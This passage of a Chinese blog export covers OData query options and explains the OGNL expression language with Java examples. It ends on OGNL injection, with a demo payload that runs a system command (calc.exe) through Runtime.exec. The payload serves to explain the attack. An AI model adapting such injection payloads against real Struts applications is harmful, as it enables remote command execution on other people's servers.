<p>OData中的实体类型之间有关系（relationship）。比如顾客（Customer）类型可以有一系列的订单（Orders）。这样一来，顾客类型与订单类型相关。顾客类型上可以定义导航属性（navigation property）用于描述这种关系（如上例中Customer类型的Orders属性）。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查询格式: GET ~/实体类型集合?$expand=其他实体类型</span><br></pre></td></tr></table></figure>



<p>示例:</p>
<p>返回Customers类型中Orders的子集</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://services.odata.org/V3/Northwind/Northwind.svc/Customers?$expand=Orders</span><br></pre></td></tr></table></figure>

<img src="/2021/11/15/ODATA%E7%94%A8%E6%B3%95%E7%AE%80%E4%BB%8B/image-20211116135324387.png" class title="image-20211116135324387">



<h4 id="过滤查询-filter"><a href="#过滤查询-filter" class="headerlink" title="过滤查询($filter)"></a>过滤查询($filter)</h4><p>OData内置了一系列如上面例子中”gt”的过滤操作符（filter operations）和一些查询函数（query functions）用来支持不同的过滤查询需求。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查询语句: GET ~/实体?$filter=实体属性操作语句 </span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://services.odata.org/V3/Northwind/Northwind.svc/Customers(&#x27;ALFKI&#x27;)?$filter=Country%20eq%20%27Germany%27</span><br></pre></td></tr></table></figure>

<p>返回Customers(‘ALFKI’)中Country属性为Germany的数据</p>
<img src="/2021/11/15/ODATA%E7%94%A8%E6%B3%95%E7%AE%80%E4%BB%8B/image-20211116142402227.png" class title="image-20211116142402227">



<p>过滤查询设置表达式需要内置过滤操作符</p>
<p>参考文档如下；</p>
<p><a href="http://docs.oasis-open.org/odata/odata/v4.0/errata02/os/complete/part1-protocol/odata-v4.0-errata02-os-part1-protocol-complete.html#_Toc406398303">OData Version 4.0 Part 1: Protocol Plus Errata 02 (oasis-open.org)</a></p>
<h4 id="统计总数-count"><a href="#统计总数-count" class="headerlink" title="统计总数($count)"></a>统计总数($count)</h4><p>$count用来统计实体集合中实体数量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">统计命令： https://services.odata.org/V3/Northwind/Northwind.svc/实体集合/$count</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://services.odata.org/V3/Northwind/Northwind.svc/Products/$count</span><br></pre></td></tr></table></figure>

<p>统计Product类型实体的总数为77</p>
<img src="/2021/11/15/ODATA%E7%94%A8%E6%B3%95%E7%AE%80%E4%BB%8B/image-20211116142842365.png" class title="image-20211116142842365">



<h4 id="限定范围-top和-skip"><a href="#限定范围-top和-skip" class="headerlink" title="限定范围($top和$skip)"></a>限定范围($top和$skip)</h4><p>$top返回查询结果中的前n条记录，$skip越过查询结果中的n条记录，这两个参数都常用来分页</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查询命令 :  https://services.odata.org/V3/Northwind/Northwind.svc/实体集合?$top=n&amp;$skip=n</span><br></pre></td></tr></table></figure>



<p>查询Products实体集合前2条记录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://services.odata.org/V3/Northwind/Northwind.svc/Products?$top=2</span><br></pre></td></tr></table></figure>

<img src="/2021/11/15/ODATA%E7%94%A8%E6%B3%95%E7%AE%80%E4%BB%8B/image-20211116143548406.png" class title="image-20211116143548406">



<p>查询Products实体集合中不包含前两条记录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://services.odata.org/V3/Northwind/Northwind.svc/Products?$skip=2</span><br></pre></td></tr></table></figure>

<img src="/2021/11/15/ODATA%E7%94%A8%E6%B3%95%E7%AE%80%E4%BB%8B/image-20211116144246408.png" class title="image-20211116144246408">



<p>查询获取第3和第4个实体集合的记录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://services.odata.org/V3/Northwind/Northwind.svc/Products?$top=2&amp;$skip=2</span><br></pre></td></tr></table></figure>

<img src="/2021/11/15/ODATA%E7%94%A8%E6%B3%95%E7%AE%80%E4%BB%8B/image-20211116144447375.png" class title="image-20211116144447375">



<h4 id="格式化输出-format"><a href="#格式化输出-format" class="headerlink" title="格式化输出($format)"></a>格式化输出($format)</h4><p>将查询返回的数据JSON格式化。Service document和metadata document只能以XML格式展示</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">格式化命令:https://services.odata.org/V3/Northwind/Northwind.svc/实体集合?$format=json</span><br></pre></td></tr></table></figure>



<p>将查询结果输出为json格式</p>
<img src="/2021/11/15/ODATA%E7%94%A8%E6%B3%95%E7%AE%80%E4%BB%8B/image-20211116145230659.png" class title="image-20211116145230659">



<h4 id="排序输出-orderby"><a href="#排序输出-orderby" class="headerlink" title="排序输出($orderby)"></a>排序输出($orderby)</h4><p>根据结果中的属性字段进行排序(AES升序,DESC降序)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令:https://services.odata.org/V3/Northwind/Northwind.svc/实体集合?$orderby=实体属性%20desc/aes</span><br></pre></td></tr></table></figure>



<p>将前两条记录中的UnitPrice属性降序处理</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令:https://services.odata.org/V3/Northwind/Northwind.svc/Products?$top=2&amp;$orderby=UnitPrice%20desc&amp;$format=json</span><br></pre></td></tr></table></figure>

<img src="/2021/11/15/ODATA%E7%94%A8%E6%B3%95%E7%AE%80%E4%BB%8B/image-20211116152912055.png" class title="image-20211116152912055">



<h4 id="获取资源总数-inlinecount"><a href="#获取资源总数-inlinecount" class="headerlink" title="获取资源总数($inlinecount)"></a>获取资源总数($inlinecount)</h4><p>分页取数据的时候,同时统计总记录数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令:https://services.odata.org/V3/Northwind/Northwind.svc/实体集合?$inlinecount=allpages</span><br></pre></td></tr></table></figure>



<p>获取Products实体集合中符合条件的资源总数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://services.odata.org/V3/Northwind/Northwind.svc/Products?$inlinecount=allpages&amp;$format=json</span><br></pre></td></tr></table></figure>

<img src="/2021/11/15/ODATA%E7%94%A8%E6%B3%95%E7%AE%80%E4%BB%8B/image-20211116155709323.png" class title="image-20211116155709323">]]></content>
      <categories>
        <category>内功心法</category>
        <category>协议用法</category>
      </categories>
      <tags>
        <tag>-数据查询 -ODAT -开放数据协议</tag>
      </tags>
  </entry>
  <entry>
    <title>OGNL表达式</title>
    <url>/2022/03/05/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
    <content><![CDATA[<h1 id="OGNL表达式"><a href="#OGNL表达式" class="headerlink" title="OGNL表达式"></a>OGNL表达式</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>OGNL是Object Graphic Navigation Language(对象图导航语言)的缩写，它是一种功能强大的表达式语言，通过它简单一致的表达式语法，可以存取对象的任意属性，调用对象的方法，遍历整个对象的结构图，实现字段类型转化等功能。它使用相同的表达式去存取对象的属性。这样可以更好的取得数据。Struts框架使用OGNL作为默认的表达式语言</p>
<h3 id="三要素"><a href="#三要素" class="headerlink" title="三要素"></a>三要素</h3><p>首先来介绍下 OGNL 的三要素：</p>
<ul>
<li><p><strong>表达式（Expression）</strong>：</p>
<p>表达式是整个 OGNL 的核心内容，所有的 OGNL 操作都是针对表达式解析后进行的。通过表达式来告诉 OGNL 操作到底要干些什么。因此，表达式其实是一个带有语法含义的字符串，整个字符串将规定操作的类型和内容。OGNL 表达式支持大量的表达式，如 “链式访问对象”、表达式计算、甚至还支持 Lambda 表达式。</p>
</li>
<li><p><strong>Root 对象</strong>：</p>
<p>OGNL 的 Root 对象可以理解为 OGNL 的操作对象。当我们指定了一个表达式的时候，我们需要指定这个表达式针对的是哪个具体的对象。而这个具体的对象就是 Root 对象，这就意味着，如果有一个 OGNL 表达式，那么我们需要针对 Root 对象来进行 OGNL 表达式的计算并且返回结果。</p>
</li>
<li><p><strong>上下文环境</strong>：</p>
<p>有个 Root 对象和表达式，我们就可以使用 OGNL 进行简单的操作了，如对 Root 对象的赋值与取值操作。但是，实际上在 OGNL 的内部，所有的操作都会在一个特定的数据环境中运行。这个数据环境就是上下文环境（Context）。OGNL 的上下文环境是一个 Map 结构，称之为 OgnlContext。Root 对象也会被添加到上下文环境当中去。</p>
<p>说白了上下文就是一个 MAP 结构，它实现了 java.utils.Map 的接口。</p>
</li>
</ul>
<h3 id="优势"><a href="#优势" class="headerlink" title="优势"></a>优势</h3><ul>
<li>支持对象方法调用，如：×××.doSomeSpecial();</li>
<li>支持类静态的方法调用和值访问，表达式的格式</li>
</ul>
<blockquote>
<p>@[类全名（包括包路径）]@[方法名 |  值名]，例如：<br>@java.lang.String@format(‘foo %s’, ‘bar’)<br>或@tutorial.MyConstant@APP_NAME；</p>
</blockquote>
<ul>
<li>支持赋值操作和表达式串联，</li>
</ul>
<blockquote>
<p>如price&#x3D;100, discount&#x3D;0.8,calculatePrice()，这个表达式会返回80；</p>
</blockquote>
<ul>
<li>访问OGNL上下文（OGNL context）和ActionContext；</li>
<li>操作（创建）集合对象。</li>
</ul>
<p><strong>总结：</strong>OGNL 有一个上下文（Context）概念，说白了上下文就是一个MAP结构，它实现了java.utils.Map 的接口。</p>
<h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><ul>
<li>jsp页面取值用</li>
<li>EL表达式语言，也用于页面取值，是jsp页面取值的标准（默认就可以使用）</li>
<li>Ognl表达式语言，Struts标签默认支持的表达式语言，必须配置Struts标签用，不能离开Struts标签直接使用，就是说Ognl必须在Struts中使用</li>
<li>对比来看，EL使用范围更广，项目中不限制使用哪一种，哪一种熟悉就使用哪一种</li>
</ul>
<h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2><p>#、%和$符号在OGNL表达式中经常出现，这里简单介绍一下三种表达式的用途</p>
<h3 id="符号"><a href="#符号" class="headerlink" title="#符号"></a>#符号</h3><p>#符号的三种用法:</p>
<p>  1）访问非根对象属性，例如示例中的#session.msg表达式，由于Struts 2中值栈被视为根对象，所以访问其他非根对象时，需要加#前缀。实际上，#相当于ActionContext. getContext()；#session.msg表达式相当于ActionContext.getContext().getSession(). getAttribute(“msg”) 。</p>
<p>  2）用于过滤和投影（projecting）集合，如示例中的persons.{?#this.age&gt;20}。</p>
<p> 3） 用来构造Map，例如示例中的#{‘foo1’:’bar1’, ‘foo2’:’bar2’}。</p>
<h3 id="符号-1"><a href="#符号-1" class="headerlink" title="%符号"></a>%符号</h3><p> %符号的用途是在标志的属性为字符串类型时，告诉执行环境‘%{}’中的是 OGNL 表达式，计算OGNL表达式的值。</p>
<h3 id="符号-2"><a href="#符号-2" class="headerlink" title="$符号"></a>$符号</h3><p>$符号主要有两个方面的用途。</p>
<p>  1） 在国际化资源文件中，引用OGNL表达式，例如国际化资源文件中的代码：reg.agerange&#x3D;国际化资源信息：年龄必须在</p>
<p>${min}同${max}之间。</p>
<p>  2） 在Struts 2框架的配置文件中引用OGNL表达式，例如下面的代码片断所示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">10100BAction-test校验：数字必须为$&#123;min&#125;为$&#123;max&#125;之间！</span><br></pre></td></tr></table></figure>

<h3 id="和-和-的区别"><a href="#和-和-的区别" class="headerlink" title="#和.和@的区别"></a>#和.和@的区别</h3><ul>
<li>获取静态函数和变量的时候用@</li>
<li>获取非静态函数用.号获取</li>
<li>获取非静态变量用#获取</li>
</ul>
<h2 id="基础用法"><a href="#基础用法" class="headerlink" title="基础用法"></a>基础用法</h2><p>Pom.xml添加依赖</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;ognl&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;ognl&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;3.1.11&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.projectlombok&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;lombok&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;1.16.10&lt;/version&gt;</span><br><span class="line">            &lt;scope&gt;provided&lt;/scope&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br></pre></td></tr></table></figure>



<h3 id="对Root对象的访问"><a href="#对Root对象的访问" class="headerlink" title="对Root对象的访问"></a>对Root对象的访问</h3><p>OGNL 使用的是一种链式的风格进行对象的访问，中间使用<code>.</code>进行连接；所有的OGNL表达式都基于当前对象的上下文来完成求值运算，链的前面部分的结果将作为后面求值的上下文。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"><span class="keyword">import</span> ognl.Ognl;</span><br><span class="line"><span class="keyword">import</span> ognl.OgnlException;</span><br><span class="line"></span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">OgnlTest</span> &#123;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">static</span> <span class="title">void</span> <span class="title">main</span>(<span class="params">String[] args</span>) <span class="title">throws</span> <span class="title">OgnlException</span> &#123;</span></span><br><span class="line"><span class="class">        <span class="title">User</span> <span class="title">user</span> = <span class="title">new</span> <span class="title">User</span>();</span></span><br><span class="line"><span class="class">        <span class="title">user</span>.<span class="title">setAge</span>(<span class="params"><span class="number">16</span></span>);</span></span><br><span class="line"><span class="class">        <span class="title">user</span>.<span class="title">setName</span>(<span class="params"><span class="string">&quot;hello&quot;</span></span>);</span></span><br><span class="line"><span class="class">        <span class="title">Info</span> <span class="title">info</span> = <span class="title">new</span> <span class="title">Info</span>(<span class="params"><span class="string">&quot;1&quot;</span>,<span class="string">&quot;2&quot;</span></span>);</span></span><br><span class="line"><span class="class">        <span class="title">user</span>.<span class="title">setInfo</span>(<span class="params">info</span>);</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">        <span class="title">System</span>.<span class="title">out</span>.<span class="title">println</span>(<span class="params">Ognl.getValue(<span class="params"><span class="string">&quot;age&quot;</span>, user</span>)</span>);    // 16</span></span><br><span class="line"><span class="class">        <span class="title">System</span>.<span class="title">out</span>.<span class="title">println</span>(<span class="params">Ognl.getValue(<span class="params"><span class="string">&quot;name&quot;</span>, user</span>)</span>);    // <span class="title">hello</span></span></span><br><span class="line"><span class="class">        <span class="title">System</span>.<span class="title">out</span>.<span class="title">println</span>(<span class="params">Ognl.getValue(<span class="params"><span class="string">&quot;name.length&quot;</span>, user</span>)</span>);    // 5</span></span><br><span class="line"><span class="class">        <span class="title">System</span>.<span class="title">out</span>.<span class="title">println</span>(<span class="params">Ognl.getValue(<span class="params"><span class="string">&quot;info&quot;</span>, user</span>)</span>);    // <span class="title">Info</span>(<span class="params">a=<span class="number">1</span>, b=<span class="number">2</span></span>)</span></span><br><span class="line"><span class="class">        <span class="title">System</span>.<span class="title">out</span>.<span class="title">println</span>(<span class="params">Ognl.getValue(<span class="params"><span class="string">&quot;info.a&quot;</span>, user</span>)</span>);    // 1</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">@<span class="title">Data</span></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">User</span> &#123;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    <span class="title">private</span> <span class="title">String</span> <span class="title">name</span>;</span></span><br><span class="line"><span class="class">    <span class="title">private</span> <span class="title">int</span> <span class="title">age</span>;</span></span><br><span class="line"><span class="class">    <span class="title">private</span> <span class="title">Info</span> <span class="title">info</span>;</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">@<span class="title">Data</span></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">Info</span> &#123;</span></span><br><span class="line"><span class="class">    <span class="title">private</span> <span class="title">String</span> <span class="title">a</span>;</span></span><br><span class="line"><span class="class">    <span class="title">private</span> <span class="title">String</span> <span class="title">b</span>;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">Info</span>(<span class="params">String a, String b</span>)&#123;</span></span><br><span class="line"><span class="class">        <span class="title">this</span>.<span class="title">a</span> = <span class="title">a</span>;</span></span><br><span class="line"><span class="class">        <span class="title">this</span>.<span class="title">b</span> = <span class="title">b</span>;</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">&#125;</span></span><br></pre></td></tr></table></figure>

<p>运行结果:</p>
<img src="/2022/03/05/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220314164047684.png" class title="image-20220314164047684">



<h3 id="对上下文对象的访问"><a href="#对上下文对象的访问" class="headerlink" title="对上下文对象的访问"></a>对上下文对象的访问</h3><p>使用 OGNL 的时候如果不设置上下文对象，系统会自动创建一个上下文对象，如果传入的参数当中包含了上下文对象则会使用传入的上下文对象。</p>
<p>当访问上下文环境当中的参数时候，需要在表达式前面加上 ‘#’ ，表示了与访问 Root 对象的区别。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">import lombok.Data;</span><br><span class="line">import ognl.Ognl;</span><br><span class="line">import ognl.OgnlException;</span><br><span class="line"></span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class OgnlTest1 &#123;</span><br><span class="line">    public static void main(String[] args) throws OgnlException &#123;</span><br><span class="line">        User1 user = new User1();</span><br><span class="line">        user.setAge(16);</span><br><span class="line">        user.setName(&quot;hello&quot;);</span><br><span class="line">        Info1 info = new Info1(&quot;1&quot;,&quot;2&quot;);</span><br><span class="line">        user.setInfo(info);</span><br><span class="line"></span><br><span class="line">        Map context = new HashMap();</span><br><span class="line">        context.put(&quot;test&quot;, &quot;testValue&quot;);</span><br><span class="line">        context.put(&quot;aaa&quot;, user);</span><br><span class="line"></span><br><span class="line">        System.out.println(Ognl.getValue(&quot;#test&quot;, context, user));  // testValue</span><br><span class="line">        System.out.println(Ognl.getValue(&quot;#aaa&quot;, context, user));  // User(name=hello, age=16, info=Info(a=1, b=2))</span><br><span class="line">        System.out.println(Ognl.getValue(&quot;#aaa.name&quot;, context, user)); // hello</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@Data</span><br><span class="line">class User1 &#123;</span><br><span class="line"></span><br><span class="line">    private String name;</span><br><span class="line">    private int age;</span><br><span class="line">    private Info1 info;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@Data</span><br><span class="line">class Info1 &#123;</span><br><span class="line">    private String a;</span><br><span class="line">    private String b;</span><br><span class="line"></span><br><span class="line">    public Info1(String a, String b)&#123;</span><br><span class="line">        this.a = a;</span><br><span class="line">        this.b = b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果:</p>
<img src="/2022/03/05/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220314164739479.png" class title="image-20220314164739479">

<h3 id="对静态变量的访问"><a href="#对静态变量的访问" class="headerlink" title="对静态变量的访问"></a>对静态变量的访问</h3><p>在 OGNL 表达式当中也可以访问静态变量或者调用静态方法，格式如 <code>@[class]@[field/method()]</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">import ognl.Ognl;</span><br><span class="line">import ognl.OgnlException;</span><br><span class="line"></span><br><span class="line">public class OgnlTest3 &#123;</span><br><span class="line">    public static String test = &quot;This is a test!!!!!&quot;;</span><br><span class="line">            public static void main(String[] args) throws OgnlException &#123;</span><br><span class="line">                System.out.println(Ognl.getValue(&quot;@org.example.OgnlTest3@test&quot;,null));</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果:</p>
<img src="/2022/03/05/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220314165425968.png" class title="image-20220314165425968">

<h3 id="方法的调用"><a href="#方法的调用" class="headerlink" title="方法的调用"></a>方法的调用</h3><p>如果需要调用 Root 对象或者上下文对象当中的方法也可以使用类似的方式来调用。甚至可以传入参数。</p>
<p>赋值的时候可以选择上下文当中的元素进行给 Root 对象的 name 属性赋值。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">import lombok.Data;</span><br><span class="line">import ognl.Ognl;</span><br><span class="line">import ognl.OgnlException;</span><br><span class="line"></span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class OgnlTest4 &#123;</span><br><span class="line">    public static void main(String[] args) throws OgnlException &#123;</span><br><span class="line">        User4 user = new User4();</span><br><span class="line">        Map context = new HashMap();</span><br><span class="line">        context.put(&quot;test&quot;, &quot;testValue&quot;);</span><br><span class="line">        context.put(&quot;aaa&quot;, user);</span><br><span class="line"></span><br><span class="line">        System.out.println(Ognl.getValue(&quot;getName()&quot;, context, user));  // null</span><br><span class="line">        Ognl.getValue(&quot;setName(#test)&quot;, context, user); // 执行setName方法</span><br><span class="line">        System.out.println(Ognl.getValue(&quot;getName()&quot;, context, user));  // testValue</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@Data</span><br><span class="line">class User4 &#123;</span><br><span class="line"></span><br><span class="line">    private String name;</span><br><span class="line">    private int age;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果:</p>
<img src="/2022/03/05/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220314165803652.png" class title="image-20220314165803652">



<h3 id="对数组和集合的访问"><a href="#对数组和集合的访问" class="headerlink" title="对数组和集合的访问"></a>对数组和集合的访问</h3><p>OGNL 支持对数组按照数组下标的顺序进行访问。此方式也适用于对集合的访问，对于 Map 支持使用键进行访问。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">import ognl.Ognl;</span><br><span class="line">import ognl.OgnlException;</span><br><span class="line"></span><br><span class="line">import java.util.ArrayList;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.List;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class OgnlTest5 &#123;</span><br><span class="line">    public static void main(String[] args) throws OgnlException &#123;</span><br><span class="line">        List list = new ArrayList&lt;&gt;();</span><br><span class="line">        list.add(&quot;123&quot;);</span><br><span class="line">        list.add(&quot;456&quot;);</span><br><span class="line"></span><br><span class="line">        Map map = new HashMap();</span><br><span class="line">        map.put(&quot;test1&quot;, &quot;value1&quot;);</span><br><span class="line"></span><br><span class="line">        Map context = new HashMap();</span><br><span class="line">        context.put(&quot;list&quot;, list);</span><br><span class="line">        context.put(&quot;map&quot;, map);</span><br><span class="line"></span><br><span class="line">        System.out.println(Ognl.getValue(&quot;#list[0]&quot;, context, list));   // 123</span><br><span class="line">        System.out.println(Ognl.getValue(&quot;#map[&#x27;test1&#x27;]&quot;, context, map));   // value1</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果:</p>
<img src="/2022/03/05/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220314170208984.png" class title="image-20220314170208984">

<h3 id="投影与选择"><a href="#投影与选择" class="headerlink" title="投影与选择"></a>投影与选择</h3><ul>
<li><p><strong>投影</strong>：选出集合当中的相同属性组合成一个新的集合。语法为 collection.{XXX}，XXX 就是集合中每个元素的公共属性。</p>
</li>
<li><p><strong>选择</strong>：选择就是选择出集合当中符合条件的元素组合成新的集合。语法为 collection.{Y XXX}，其中 Y 是一个选择操作符，XXX 是选择用的逻辑表达式。</p>
<p>选择操作符有 3 种：</p>
<ul>
<li>? ：选择满足条件的所有元素</li>
<li>^：选择满足条件的第一个元素</li>
<li>$：选择满足条件的最后一个元素</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">import lombok.Data;</span><br><span class="line">import ognl.Ognl;</span><br><span class="line">import ognl.OgnlException;</span><br><span class="line"></span><br><span class="line">import java.util.ArrayList;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class OgnlTest6 &#123;</span><br><span class="line">    public static void main(String[] args) throws OgnlException &#123;</span><br><span class="line">        User6 u1 = new User6(&quot;name1&quot;, 11);</span><br><span class="line">        User6 u2 = new User6(&quot;name2&quot;, 22);</span><br><span class="line">        User6 u3 = new User6(&quot;name3&quot;, 33);</span><br><span class="line">        User6 u4 = new User6(&quot;name4&quot;, 44);</span><br><span class="line"></span><br><span class="line">        ArrayList&lt;User6&gt; list = new ArrayList&lt;User6&gt;();</span><br><span class="line">        list.add(u1);</span><br><span class="line">        list.add(u2);</span><br><span class="line">        list.add(u3);</span><br><span class="line">        list.add(u4);</span><br><span class="line"></span><br><span class="line">        Map context = new HashMap();</span><br><span class="line">        context.put(&quot;list&quot;, list);</span><br><span class="line"></span><br><span class="line">        System.out.println(Ognl.getValue(&quot;#list.&#123;age&#125;&quot;, context, list));    // [11, 22, 33, 44]</span><br><span class="line">        System.out.println(Ognl.getValue(&quot;#list.&#123;? #this.age &gt; 22&#125;&quot;, context, list));   // [User(name=name3, age=33), User(name=name4, age=44)]</span><br><span class="line">        System.out.println(Ognl.getValue(&quot;#list.&#123;^ #this.age &gt; 22&#125;&quot;, context, list));   // [User(name=name3, age=33)]</span><br><span class="line">        System.out.println(Ognl.getValue(&quot;#list.&#123;$ #this.age &gt; 22&#125;&quot;, context, list));   // [User(name=name4, age=44)]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@Data</span><br><span class="line">class User6 &#123;</span><br><span class="line"></span><br><span class="line">    private String name;</span><br><span class="line">    private int age;</span><br><span class="line"></span><br><span class="line">    public User6(String name, int age) &#123;</span><br><span class="line">        this.name = name;</span><br><span class="line">        this.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果:</p>
<img src="/2022/03/05/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220314170821547.png" class title="image-20220314170821547">

<h3 id="创建对象"><a href="#创建对象" class="headerlink" title="创建对象"></a>创建对象</h3><p>OGNL 支持直接使用表达式来创建对象。主要有三种情况：</p>
<ul>
<li>构造 List 对象：使用 {}, 中间使用 ‘,’ 进行分割如 {“aa”, “bb”, “cc”}</li>
<li>构造 Map 对象：使用 #{}，中间使用 ‘, 进行分割键值对，键值对使用 ‘:’ 区分，如 #{“key1” : “value1”, “key2” : “value2”}</li>
<li>构造任意对象：直接使用已知的对象的构造方法进行构造。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">System.out.println(Ognl.getValue(&quot;&#123;&#x27;key1&#x27;,&#x27;value1&#x27;&#125;&quot;, null));    // [key1, value1]</span><br><span class="line">System.out.println(Ognl.getValue(&quot;#&#123;&#x27;key1&#x27;:&#x27;value1&#x27;&#125;&quot;, null));    // &#123;key1=value1&#125;</span><br><span class="line">System.out.println(Ognl.getValue(&quot;new java.lang.String(&#x27;123&#x27;)&quot;, null));    // 123</span><br></pre></td></tr></table></figure>



<h2 id="OGNL表达式注入"><a href="#OGNL表达式注入" class="headerlink" title="OGNL表达式注入"></a>OGNL表达式注入</h2><p>对于OGNL表达式注入，在Struts2.x中漏洞频出，通过构造payload调用系统命令执行。OGNL可以访问静态方法、属性和对象方法等，其中包括可执行恶意操作的命令执行类java.lang.Runtime等，当OGNL表达式输入外部可控时，就可以构造恶意payload造成命令执行。</p>
<h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><p>调用java.lang.Runtime类中的getRuntime().exec()方法，调用格式@{Class}@{Method}</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">import ognl.Ognl;</span><br><span class="line">import ognl.OgnlException;</span><br><span class="line"></span><br><span class="line">public class Ognlexec &#123;</span><br><span class="line">    public static void main(String[] args) throws OgnlException &#123;</span><br><span class="line">        String payload=&quot;@java.lang.Runtime@getRuntime().exec(&#x27;calc.exe&#x27;)&quot;;</span><br><span class="line">        System.out.println(Ognl.getValue(payload,null));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<img src="/2022/03/05/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220314172440717.png" class title="image-20220314172440717">

